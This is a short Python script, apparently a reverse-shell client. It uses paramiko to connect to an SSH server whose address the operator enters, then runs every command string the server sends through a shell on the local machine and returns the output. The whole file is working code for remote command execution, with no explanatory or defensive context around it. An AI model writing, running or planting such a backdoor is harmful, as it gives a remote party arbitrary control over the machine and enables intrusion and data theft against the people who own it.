import paramiko
import subprocess

def ssh_command(ip, port, user, passwd, banner):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=int(port), username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(banner)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024).decode()
            try:
                if command.strip() == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                ssh_session.send(cmd_output or b'okay')
            except Exception as e:
                ssh_session.send(str(e).encode())
        client.close()

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ') or '22'
    ssh_command(ip, port, user, password, 'ClientConnected')